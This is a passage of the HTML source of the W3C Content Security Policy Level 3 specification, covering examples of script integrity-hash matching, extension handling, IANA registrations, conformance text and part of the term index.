<pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
      <p>While the following <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script②⓪">script</a></code> elements would not execute because they
      contain valid metadata that does not match the policy (even though other
      metadata does match):</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"</c-><b><c- s>sha384-xyz789</c-></b><c- s>"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"</c-><b><c- s>sha384-xyz789</c-></b><c- s> sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 </c-><b><c- s>sha384-xyz789</c-></b><c- s> sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
      <p>Metadata that is not recognized (either because it’s entirely invalid, or
      because it specifies a not-yet-supported hashing algorithm) does not affect
      the behavior described here. That is, the following elements would be
      allowed to execute in the presence of the above policy, as the additional
      metadata is invalid and therefore wouldn’t allow a script whose content
      wasn’t listed explicitly in the policy to execute:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 </c-><b><c- s>sha1024-abcd</c-></b><c- s>"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha512-321cba </c-><b><c- s>entirely-invalid</c-></b><c- s>"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 </c-><b><c- s>not-a-hash-at-all</c-></b><c- s> sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
     </div>
    </section>
   </section>
   <section>
    <h2 class="heading settled" data-level="9" id="implementation-considerations"><span class="secno">9. </span><span class="content">Implementation Considerations</span><a class="self-link" href="#implementation-considerations"></a></h2>
    <h3 class="heading settled" data-level="9.1" id="extensions"><span class="secno">9.1. </span><span class="content">Vendor-specific Extensions and Addons</span><a class="self-link" href="#extensions"></a></h3>
    <p><a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑧③">Policy</a> enforced on a resource SHOULD NOT interfere with the operation
  of user-agent features like addons, extensions, or bookmarklets. These kinds
  of features generally advance the user’s priority over page authors, as
  espoused in <a data-link-type="biblio" href="#biblio-html-design" title="HTML Design Principles">[HTML-DESIGN]</a>.</p>
    <p>Moreover, applying CSP to these kinds of features produces a substantial
  amount of noise in violation reports, significantly reducing their value to
  developers.</p>
    <p>Chrome, for example, excludes the <code>chrome-extension:</code> scheme from CSP checks,
  and does some work to ensure that extension-driven injections are allowed,
  regardless of a page’s policy.</p>
   </section>
   <section>
    <h2 class="heading settled" data-level="10" id="iana-considerations"><span class="secno">10. </span><span class="content">IANA Considerations</span><a class="self-link" href="#iana-considerations"></a></h2>
    <h3 class="heading settled" data-level="10.1" id="iana-registry"><span class="secno">10.1. </span><span class="content"> Directive Registry </span><a class="self-link" href="#iana-registry"></a></h3>
    <p>The Content Security Policy Directive registry should be updated with the
  following directives and references <a data-link-type="biblio" href="#biblio-rfc7762" title="Initial Assignment for the Content Security Policy Directives Registry">[RFC7762]</a>:</p>
    <dl>
     <dt data-md><a data-link-type="dfn" href="#base-uri" id="ref-for-base-uri②"><code>base-uri</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-base-uri">§ 6.2.1 base-uri</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#child-src" id="ref-for-child-src①"><code>child-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-child-src">§ 6.1.1 child-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src③"><code>connect-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-connect-src">§ 6.1.2 connect-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#default-src" id="ref-for-default-src⑤"><code>default-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-default-src">§ 6.1.3 default-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#font-src" id="ref-for-font-src④"><code>font-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-font-src">§ 6.1.4 font-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#form-action" id="ref-for-form-action①"><code>form-action</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-form-action">§ 6.3.1 form-action</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#frame-ancestors" id="ref-for-frame-ancestors⑤"><code>frame-ancestors</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-frame-ancestors">§ 6.3.2 frame-ancestors</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src③"><code>frame-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-frame-src">§ 6.1.5 frame-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#img-src" id="ref-for-img-src④"><code>img-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-img-src">§ 6.1.6 img-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src③"><code>manifest-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-manifest-src">§ 6.1.7 manifest-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#media-src" id="ref-for-media-src③"><code>media-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-media-src">§ 6.1.8 media-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#object-src" id="ref-for-object-src④"><code>object-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-object-src">§ 6.1.9 object-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri④"><code>report-uri</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-report-uri">§ 6.4.1 report-uri</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#report-to" id="ref-for-report-to⑤"><code>report-to</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-report-to">§ 6.4.2 report-to</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#sandbox" id="ref-for-sandbox①"><code>sandbox</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-sandbox">§ 6.2.2 sandbox</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#script-src" id="ref-for-script-src⑤"><code>script-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-script-src">§ 6.1.11 script-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr⑤"><code>script-src-attr</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-script-src-attr">§ 6.1.13 script-src-attr</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem⑤"><code>script-src-elem</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-script-src-elem">§ 6.1.12 script-src-elem</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#style-src" id="ref-for-style-src①"><code>style-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-style-src">§ 6.1.14 style-src</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#style-src-attr" id="ref-for-style-src-attr②"><code>style-src-attr</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-style-src-attr">§ 6.1.16 style-src-attr</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#style-src-elem" id="ref-for-style-src-elem②"><code>style-src-elem</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-style-src-elem">§ 6.1.15 style-src-elem</a>)</p>
     <dt data-md><a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src④"><code>worker-src</code></a>
     <dd data-md>
      <p>This document (see <a href="#directive-worker-src">§ 6.1.17 worker-src</a>)</p>
    </dl>
    <h3 class="heading settled" data-level="10.2" id="iana-headers"><span class="secno">10.2. </span><span class="content"> Headers </span><a class="self-link" href="#iana-headers"></a></h3>
    <p>The permanent message header field registry should be updated
  with the following registrations: <a data-link-type="biblio" href="#biblio-rfc3864" title="Registration Procedures for Message Header Fields">[RFC3864]</a></p>
    <h4 class="heading settled" data-level="10.2.1" id="iana-csp"><span class="secno">10.2.1. </span><span class="content">Content-Security-Policy</span><a class="self-link" href="#iana-csp"></a></h4>
    <dl>
     <dt>Header field name
     <dd>Content-Security-Policy
     <dt>Applicable protocol
     <dd>http
     <dt>Status
     <dd>standard
     <dt>Author/Change controller
     <dd>W3C
     <dt>Specification document
     <dd>This specification (See <a href="#csp-header">§ 3.1 The Content-Security-Policy HTTP Response Header Field</a>)
    </dl>
    <h4 class="heading settled" data-level="10.2.2" id="iana-cspro"><span class="secno">10.2.2. </span><span class="content">Content-Security-Policy-Report-Only</span><a class="self-link" href="#iana-cspro"></a></h4>
    <dl>
     <dt>Header field name
     <dd>Content-Security-Policy-Report-Only
     <dt>Applicable protocol
     <dd>http
     <dt>Status
     <dd>standard
     <dt>Author/Change controller
     <dd>W3C
     <dt>Specification document
     <dd>This specification (See <a href="#cspro-header">§ 3.2 The Content-Security-Policy-Report-Only HTTP Response Header Field</a>)
    </dl>
   </section>
   <section>
    <h2 class="heading settled" data-level="11" id="acknowledgements"><span class="secno">11. </span><span class="content">Acknowledgements</span><a class="self-link" href="#acknowledgements"></a></h2>
    <p>Lots of people are awesome. For instance:</p>
    <ul>
     <li data-md>
      <p>Mario and all of Cure53.</p>
     <li data-md>
      <p>Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, Jochen Eisinger, and the
rest of Google’s CSP Cabal.</p>
    </ul>
   </section>
  </main>
  <div data-fill-with="conformance">
   <h2 class="no-ref no-num heading settled" id="w3c-conformance"><span class="content">Conformance</span><a class="self-link" href="#w3c-conformance"></a></h2>
   <h3 class="no-ref no-num heading settled" id="w3c-conventions"><span class="content">Document conventions</span><a class="self-link" href="#w3c-conventions"></a></h3>
   <p>Conformance requirements are expressed
    with a combination of descriptive assertions
    and RFC 2119 terminology.
    The key words “MUST”, “MUST NOT”, “REQUIRED”, “SHALL”, “SHALL NOT”, “SHOULD”, “SHOULD NOT”, “RECOMMENDED”, “MAY”, and “OPTIONAL”
    in the normative parts of this document
    are to be interpreted as described in RFC 2119.
    However, for readability,
    these words do not appear in all uppercase letters in this specification. </p>
   <p>All of the text of this specification is normative
    except sections explicitly marked as non-normative, examples, and notes. <a data-link-type="biblio" href="#biblio-rfc2119" title="Key words for use in RFCs to Indicate Requirement Levels">[RFC2119]</a> </p>
   <p>Examples in this specification are introduced with the words “for example”
    or are set apart from the normative text
    with <code>class="example"</code>,
    like this: </p>
   <div class="example" id="w3c-example">
    <a class="self-link" href="#w3c-example"></a> 
    <p>This is an example of an informative example. </p>
   </div>
   <p>Informative notes begin with the word “Note”
    and are set apart from the normative text
    with <code>class="note"</code>,
    like this: </p>
   <p class="note" role="note">Note, this is an informative note.</p>
   <section>
    <h3 class="no-ref no-num heading settled" id="w3c-conformant-algorithms"><span class="content">Conformant Algorithms</span><a class="self-link" href="#w3c-conformant-algorithms"></a></h3>
    <p>Requirements phrased in the imperative as part of algorithms
    (such as "strip any leading space characters"
    or "return false and abort these steps")
    are to be interpreted with the meaning of the key word
    ("must", "should", "may", etc)
    used in introducing the algorithm. </p>
    <p>Conformance requirements phrased as algorithms or specific steps
    can be implemented in any manner,
    so long as the end result is equivalent.
    In particular, the algorithms defined in this specification
    are intended to be easy to understand
    and are not intended to be performant.
    Implementers are encouraged to optimize. </p>
   </section>
  </div>
  <script src="https://www.w3.org/scripts/TR/2021/fixup.js"></script>
  <h2 class="no-num no-ref heading settled" id="index"><span class="content">Index</span><a class="self-link" href="#index"></a></h2>
  <h3 class="no-num no-ref heading settled" id="index-defined-here"><span class="content">Terms defined by this specification</span><a class="self-link" href="#index-defined-here"></a></h3>
  <ul class="index">
   <li><a href="#source-list-allows-all-inline-behavior">allow all inline behavior</a><span>, in § 6.6.3.2</span>
   <li><a href="#source-list-allows-all-inline-behavior">allows all inline behavior</a><span>, in § 6.6.3.2</span>
   <li><a href="#grammardef-ancestor-source">ancestor-source</a><span>, in § 6.3.2</span>
   <li><a href="#grammardef-ancestor-source-list">ancestor-source-list</a><span>, in § 6.3.2</span>
   <li><a href="#grammardef-base64-value">base64-value</a><span>, in § 2.3.1</span>
   <li><a href="#base-uri">base-uri</a><span>, in § 6.2.1</span>
   <li><a href="#dom-securitypolicyviolationevent-blockeduri">blockedURI</a><span>, in § 5.1</span>
   <li>
    blockedURL
    <ul>
     <li><a href="#dom-cspviolationreportbody-blockedurl">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-blockedurl">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-blockedurl">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#child-src">child-src</a><span>, in § 6.1.1</span>
   <li>
    colno
    <ul>
     <li><a href="#dom-securitypolicyviolationevent-colno">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-colno">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#violation-column-number">column number</a><span>, in § 2.4</span>
   <li>
    columnNumber
    <ul>
     <li><a href="#dom-cspviolationreportbody-columnnumber">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-columnnumber">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#connect-src">connect-src</a><span>, in § 6.1.2</span>
   <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">constructor(type)</a><span>, in § 5.1</span>
   <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">constructor(type, eventInitDict)</a><span>, in § 5.1</span>
   <li><a href="#contains-a-header-delivered-content-security-policy">contains a header-delivered Content Security Policy</a><span>, in § 2.2</span>
   <li><a href="#content-security-policy">Content Security Policy</a><span>, in § 1</span>
   <li><a href="#header-content-security-policy">Content-Security-Policy</a><span>, in § 3.1</span>
   <li><a href="#content-security-policy-object">content security policy object</a><span>, in § 2.2</span>
   <li><a href="#header-content-security-policy-report-only">Content-Security-Policy-Report-Only</a><span>, in § 3.2</span>
   <li>
    CSP list
    <ul>
     <li><a href="#csp-list">definition of</a><span>, in § 2.2</span>
     <li><a href="#global-object-csp-list">dfn for global object</a><span>, in § 4.2</span>
    </ul>
   <li><a href="#csp-violation-report">csp violation report</a><span>, in § 5</span>
   <li><a href="#cspviolationreportbody">CSPViolationReportBody</a><span>, in § 5</span>
   <li><a href="#default-src">default-src</a><span>, in § 6.1.3</span>
   <li><a href="#grammardef-directive-name">directive-name</a><span>, in § 2.3</span>
   <li><a href="#directives">directives</a><span>, in § 2.3</span>
   <li><a href="#policy-directive-set">directive set</a><span>, in § 2.2</span>
   <li><a href="#grammardef-directive-value">directive-value</a><span>, in § 2.3</span>
   <li>
    disposition
    <ul>
     <li><a href="#dom-cspviolationreportbody-disposition">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-disposition">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#policy-disposition">dfn for policy</a><span>, in § 2.2</span>
     <li><a href="#violation-disposition">dfn for violation</a><span>, in § 2.4</span>
     <li><a href="#dom-securitypolicyviolationeventinit-disposition">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#dom-securitypolicyviolationevent-documenturi">documentURI</a><span>, in § 5.1</span>
   <li>
    documentURL
    <ul>
     <li><a href="#dom-cspviolationreportbody-documenturl">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-documenturl">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-documenturl">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li>
    effective directive
    <ul>
     <li><a href="#request-effective-directive">dfn for request</a><span>, in § 6.7.1</span>
     <li><a href="#violation-effective-directive">dfn for violation</a><span>, in § 2.4</span>
    </ul>
   <li>
    effectiveDirective
    <ul>
     <li><a href="#dom-cspviolationreportbody-effectivedirective">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-effectivedirective">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-effectivedirective">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#violation-element">element</a><span>, in § 2.4</span>
   <li><a href="#embedding-document">embedding document</a><span>, in § 4.2</span>
   <li><a href="#dom-securitypolicyviolationeventdisposition-enforce">"enforce"</a><span>, in § 5.1</span>
   <li><a href="#enforced">enforced</a><span>, in § 4.2</span>
   <li><a href="#can-compile-strings">EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)</a><span>, in § 4.3</span>
   <li><a href="#fetch-directives">Fetch directives</a><span>, in § 6.1</span>
   <li><a href="#font-src">font-src</a><span>, in § 6.1.4</span>
   <li><a href="#form-action">form-action</a><span>, in § 6.3.1</span>
   <li><a href="#frame-ancestors">frame-ancestors</a><span>, in § 6.3.2</span>
   <li><a href="#frame-src">frame-src</a><span>, in § 6.1.5</span>
   <li><a href="#violation-global-object">global object</a><span>, in § 2.4</span>
   <li><a href="#grammardef-hash-algorithm">hash-algorithm</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-hash-source">hash-source</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-host-char">host-char</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-host-part">host-part</a><span>, in § 2.3.1</span>
   <li><a href="#host-part-match">host-part match</a><span>, in § 6.6.2.8</span>
   <li><a href="#grammardef-host-source">host-source</a><span>, in § 2.3.1</span>
   <li><a href="#img-src">img-src</a><span>, in § 6.1.6</span>
   <li><a href="#directive-initialization">initialization</a><span>, in § 2.3</span>
   <li><a href="#initialize-document-csp">Initialize a Document’s CSP list</a><span>, in § 4.2</span>
   <li><a href="#initialize-global-object-csp">Initialize a global object’s CSP list</a><span>, in § 4.2.1</span>
   <li><a href="#directive-inline-check">inline check</a><span>, in § 2.3</span>
   <li><a href="#allow-base-for-document">Is base allowed for document?</a><span>, in § 6.2.1</span>
   <li><a href="#grammardef-keyword-source">keyword-source</a><span>, in § 2.3.1</span>
   <li>
    lineno
    <ul>
     <li><a href="#dom-securitypolicyviolationevent-lineno">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-lineno">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#violation-line-number">line number</a><span>, in § 2.4</span>
   <li>
    lineNumber
    <ul>
     <li><a href="#dom-cspviolationreportbody-linenumber">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-linenumber">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#manifest-src">manifest-src</a><span>, in § 6.1.7</span>
   <li><a href="#media-src">media-src</a><span>, in § 6.1.8</span>
   <li><a href="#monitored">monitored</a><span>, in § 4.2</span>
   <li><a href="#directive-name">name</a><span>, in § 2.3</span>
   <li><a href="#navigate-to">navigate-to</a><span>, in § 6.3.3</span>
   <li><a href="#directive-navigation-response-check">navigation response check</a><span>, in § 2.3</span>
   <li><a href="#grammardef-nonce-source">nonce-source</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-none">'none'</a><span>, in § 2.3.1</span>
   <li><a href="#object-src">object-src</a><span>, in § 6.1.9</span>
   <li><a href="#grammardef-optional-ascii-whitespace">optional-ascii-whitespace</a><span>, in § 2.1</span>
   <li>
    originalPolicy
    <ul>
     <li><a href="#dom-cspviolationreportbody-originalpolicy">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-originalpolicy">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-originalpolicy">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#abstract-opdef-parse-a-serialized-csp">parse a serialized CSP</a><span>, in § 2.2.1</span>
   <li><a href="#abstract-opdef-parse-a-serialized-csp-list">parse a serialized CSP list</a><span>, in § 2.2.2</span>
   <li><a href="#grammardef-path-part">path-part</a><span>, in § 2.3.1</span>
   <li><a href="#path-part-match">path-part match</a><span>, in § 6.6.2.10</span>
   <li>
    policy
    <ul>
     <li><a href="#content-security-policy-object">definition of</a><span>, in § 2.2</span>
     <li><a href="#violation-policy">dfn for violation</a><span>, in § 2.4</span>
    </ul>
   <li><a href="#grammardef-port-part">port-part</a><span>, in § 2.3.1</span>
   <li><a href="#port-part-matches">port-part matches</a><span>, in § 6.6.2.9</span>
   <li><a href="#directive-post-request-check">post-request check</a><span>, in § 2.3</span>
   <li><a href="#prefetch-src">prefetch-src</a><span>, in § 6.1.10</span>
   <li><a href="#directive-pre-navigation-check">pre-navigation check</a><span>, in § 2.3</span>
   <li><a href="#directive-pre-request-check">pre-request check</a><span>, in § 2.3</span>
   <li>
    referrer
    <ul>
     <li><a href="#dom-cspviolationreportbody-referrer">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-referrer">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#violation-referrer">dfn for violation</a><span>, in § 2.4</span>
     <li><a href="#dom-securitypolicyviolationeventinit-referrer">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#dom-securitypolicyviolationeventdisposition-report">"report"</a><span>, in § 5.1</span>
   <li><a href="#report-for-request">Report Content Security Policy violations for request</a><span>, in § 4.1.1</span>
   <li><a href="#grammardef-report-sample">'report-sample'</a><span>, in § 2.3.1</span>
   <li><a href="#report-to">report-to</a><span>, in § 6.4.2</span>
   <li><a href="#report-uri">report-uri</a><span>, in § 6.4.1</span>
   <li><a href="#grammardef-required-ascii-whitespace">required-ascii-whitespace</a><span>, in § 2.1</span>
   <li><a href="#violation-resource">resource</a><span>, in § 2.4</span>
   <li><a href="#directive-response-check">response check</a><span>, in § 2.3</span>
   <li>
    sample
    <ul>
     <li><a href="#dom-cspviolationreportbody-sample">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-sample">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#violation-sample">dfn for violation</a><span>, in § 2.4</span>
     <li><a href="#dom-securitypolicyviolationeventinit-sample">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#sandbox">sandbox</a><span>, in § 6.2.2</span>
   <li><a href="#grammardef-scheme-part">scheme-part</a><span>, in § 2.3.1</span>
   <li><a href="#scheme-part-match">scheme-part match</a><span>, in § 6.6.2.7</span>
   <li><a href="#grammardef-scheme-source">scheme-source</a><span>, in § 2.3.1</span>
   <li><a href="#script-src">script-src</a><span>, in § 6.1.11</span>
   <li><a href="#script-src-attr">script-src-attr</a><span>, in § 6.1.13</span>
   <li><a href="#script-src-elem">script-src-elem</a><span>, in § 6.1.12</span>
   <li><a href="#securitypolicyviolationevent">SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
   <li><a href="#enumdef-securitypolicyviolationeventdisposition">SecurityPolicyViolationEventDisposition</a><span>, in § 5.1</span>
   <li><a href="#dictdef-securitypolicyviolationeventinit">SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
   <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">SecurityPolicyViolationEvent(type)</a><span>, in § 5.1</span>
   <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">SecurityPolicyViolationEvent(type, eventInitDict)</a><span>, in § 5.1</span>
   <li><a href="#grammardef-self">'self'</a><span>, in § 2.3.1</span>
   <li><a href="#policy-self-origin">self-origin</a><span>, in § 2.2</span>
   <li><a href="#serialized-csp">serialized CSP</a><span>, in § 2.2</span>
   <li><a href="#serialized-csp-list">serialized CSP list</a><span>, in § 2.2</span>
   <li><a href="#serialized-directive">serialized directive</a><span>, in § 2.3</span>
   <li><a href="#grammardef-serialized-directive">serialized-directive</a><span>, in § 2.3</span>
   <li><a href="#grammardef-serialized-policy">serialized-policy</a><span>, in § 2.2</span>
   <li><a href="#grammardef-serialized-policy-list">serialized-policy-list</a><span>, in § 2.2</span>
   <li><a href="#serialized-source-list">serialized source list</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-serialized-source-list">serialized-source-list</a><span>, in § 2.3.1</span>
   <li><a href="#set-response-csp-list">Set response’s CSP list</a><span>, in § 4.1</span>
   <li><a href="#should-block-inline">Should element’s inline type behavior be blocked by Content Security Policy?</a><span>, in § 4.2.3</span>
   <li><a href="#should-block-navigation-request">Should navigation request of type be blocked by Content Security Policy?</a><span>, in § 4.2.4</span>
   <li><a href="#should-block-navigation-response">Should navigation response to navigation request of type in target be blocked by Content Security Policy?</a><span>, in § 4.2.5</span>
   <li><a href="#should-block-request">Should request be blocked by Content Security Policy?</a><span>, in § 4.1.2</span>
   <li><a href="#should-block-response">Should response to request be blocked by Content Security Policy?</a><span>, in § 4.1.3</span>
   <li><a href="#policy-source">source</a><span>, in § 2.2</span>
   <li><a href="#source-expression">source expression</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-source-expression">source-expression</a><span>, in § 2.3.1</span>
   <li><a href="#violation-source-file">source file</a><span>, in § 2.4</span>
   <li>
    sourceFile
    <ul>
     <li><a href="#dom-cspviolationreportbody-sourcefile">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-sourcefile">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-sourcefile">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#source-lists">source lists</a><span>, in § 2.3.1</span>
   <li><a href="#violation-status">status</a><span>, in § 2.4</span>
   <li>
    statusCode
    <ul>
     <li><a href="#dom-cspviolationreportbody-statuscode">attribute for CSPViolationReportBody</a><span>, in § 5</span>
     <li><a href="#dom-securitypolicyviolationevent-statuscode">attribute for SecurityPolicyViolationEvent</a><span>, in § 5.1</span>
     <li><a href="#dom-securitypolicyviolationeventinit-statuscode">dict-member for SecurityPolicyViolationEventInit</a><span>, in § 5.1</span>
    </ul>
   <li><a href="#grammardef-strict-dynamic">'strict-dynamic'</a><span>, in § 2.3.1</span>
   <li><a href="#style-src">style-src</a><span>, in § 6.1.14</span>
   <li><a href="#style-src-attr">style-src-attr</a><span>, in § 6.1.16</span>
   <li><a href="#style-src-elem">style-src-elem</a><span>, in § 6.1.15</span>
   <li><a href="#grammardef-unsafe-allow-redirects">'unsafe-allow-redirects'</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-unsafe-eval">'unsafe-eval'</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-unsafe-hashes">'unsafe-hashes'</a><span>, in § 2.3.1</span>
   <li><a href="#grammardef-unsafe-inline">'unsafe-inline'</a><span>, in § 2.3.1</span>
   <li><a href="#violation-url">url</a><span>, in § 2.4</span>
   <li><a href="#directive-value">value</a><span>, in § 2.3</span>
   <li><a href="#dom-securitypolicyviolationevent-violateddirective">violatedDirective</a><span>, in § 5.1</span>
   <li><a href="#violation">violation</a><span>, in § 2.4</span>
   <li><a href="#worker-src">worker-src</a><span>, in § 6.1.17</span>
  </ul>
  <h3 class="no-num no-ref heading settled" id="index-defined-elsewhere"><span class="content">Terms defined by reference</span><a class="self-link" href="#index-defined-elsewhere"></a></h3>
  <ul class="index">
   <li>
    <a data-link-type="biblio">[CSS-CASCADE-5]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="3eef835e">@import</span>
    </ul>
   <li>
    <a data-link-type="biblio">[CSSOM]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="4ffecae2">insert a css rule</span>
     <li><span class="dfn-paneled" id="e49ee8ab">parse a css declaration block</span>
     <li><span class="dfn-paneled" id="30cbbf14">parse a css rule</span>
     <li><span class="dfn-paneled" id="4f06d0ed">parse a group of selectors</span>
    </ul>
   <li>
    <a data-link-type="biblio">[DOM]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="85394472">Document</span>
     <li><span class="dfn-paneled" id="296f3551">Element</span>
     <li><span class="dfn-paneled" id="129bdae8">Event</span>
